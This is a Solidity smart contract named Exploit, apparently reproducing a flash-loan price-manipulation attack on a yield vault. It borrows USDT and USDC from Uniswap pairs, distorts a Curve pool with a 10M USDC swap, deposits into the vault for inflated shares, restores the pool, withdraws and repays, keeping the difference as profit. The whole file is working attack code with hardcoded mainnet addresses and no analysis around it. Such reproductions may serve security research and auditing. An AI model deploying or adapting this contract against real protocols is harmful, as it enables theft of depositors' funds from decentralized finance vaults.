// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external;
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    function approve(address spender, uint256 amount) external;
}

interface IUniswapV2Pair {
    function swap(
        uint256,
        uint256,
        address,
        bytes calldata
    ) external;
}

interface IHVault {
    function balanceOf(address owner) external view returns (uint256);
    function deposit(uint256 amountWei) external;
    function withdraw(uint256 numberOfShares) external;
}

interface IYCurve {
    function exchange_underlying(int128 i, int128 j, uint256 _dx, uint256 _min_dy) external;
}

contract Exploit {

    IUniswapV2Pair uUSDT;
    IUniswapV2Pair uUSDC;
    IERC20 usdt;
    IERC20 usdc;
    IHVault hvault;
    IYCurve yCurve;

    event FlashLoanUsdt(uint256 amount);
    event FlashLoanUsdc(uint256 amount);
    event GetHarvestShare(uint256 amount);
    event PreRepay(uint256 usdt, uint256 usdc);
    event Profit(uint256 usdt, uint256 usdc);

    constructor() {
        hvault = IHVault(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);
        uUSDT = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852); // USDT-ETH
        uUSDC = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc); // ETH-USDC
        usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
        usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        yCurve = IYCurve(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
    }

    function uniswapV2Call(address sender, uint amount0Out, uint amount1Out, bytes calldata data) external {
        if (data[0] == 0x00) {
            emit FlashLoanUsdt(usdt.balanceOf(address(this)));
            uUSDC.swap(10000000 * 1e6, 0, address(this), hex"01");

        }
        else if (data[0] == 0x01) {
            uint256 initialUsdtAmount = usdt.balanceOf(address(this));
            uint256 initialUsdcAmount = usdc.balanceOf(address(this));
            emit FlashLoanUsdc(usdc.balanceOf(address(this)));
            // yvault indices: usdc  = 1, usdt = 2
            // fuck up yCurve by exchanging 10M usdc to usdt
            usdc.approve(address(yCurve), usdc.balanceOf(address(this)));
            yCurve.exchange_underlying(1, 2, usdc.balanceOf(address(this)), 0);
            
            // get inflated share
            usdt.approve(address(hvault), initialUsdtAmount);
            hvault.deposit(initialUsdtAmount- 100000 * 1e6);
            uint share = hvault.balanceOf(address(this));
            emit GetHarvestShare(share);

            // restore yCurve by exchanging 10M usdt to usdc
            usdt.approve(address(yCurve), usdt.balanceOf(address(this)));
            yCurve.exchange_underlying(2, 1, usdt.balanceOf(address(this)), 0);

            // withdraw using share
            hvault.withdraw(share);
            uint usdtBalance = usdt.balanceOf(address(this));
            uint usdcBalance = usdc.balanceOf(address(this));
            emit PreRepay(usdtBalance, usdcBalance);

            // repay
            usdc.transfer(address(uUSDC), initialUsdcAmount * 10035/10000);
            usdt.transfer(address(uUSDT), initialUsdtAmount * 10035/10000);

            uint usdtProfit = usdt.balanceOf(address(this));
            uint usdcProfit = usdc.balanceOf(address(this));
            emit Profit(usdtProfit, usdcProfit);
        }
    }
    
    function fire() public {
        uUSDT.swap(0, 50000000 * 1e6, address(this), hex"00");
    }   

}